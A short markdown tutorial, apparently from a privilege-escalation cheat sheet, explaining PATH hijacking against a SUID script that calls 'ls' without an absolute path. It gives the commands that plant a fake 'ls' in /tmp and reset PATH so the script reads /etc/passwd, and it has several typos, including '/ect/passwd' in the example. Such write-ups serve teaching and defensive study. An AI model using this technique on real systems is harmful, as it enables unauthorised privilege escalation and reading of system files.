# Relative path to run binary

### Table of Contents

- [Command without arguments](#command-without-arguments)
- [Docu](#documentation)

## Command without arguments

**Attention** if you want escalate privileges, the vulnerable script needs at least to have suid permission.

#### Explanation

When a program refere to a binary command without giving the absolute path, you can execute your own program instead of the command.<br>
This program show below refer to this venurability:

```
#!/bin/bash

ls /ect/passwd
```

When bash interpret `ls`, he is trying to find the command located in the `env | grep PATH`.<br>
It try every directory, from letf to right, to check if the executable is located in. If it is, he execute it.
The tricks is to create a new file name "ls" write some code to execute at the emplacement /ect/passwd.

```
#write the command cat inside a ls file located in /tmp
echo cat > /tmp/ls
chmod +x /tmp/ls

#modifie the PATH, to get bash to find and execute your ls file instead of the real one.
PATH=/tmp
```

Now the previous script execute `cat /etc/passwd` instead of `ls /etc/passwd`.

### Documentation

- [SUID redhat](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)<br>

---

[**:arrow_right_hook: Back home**](../README.md)
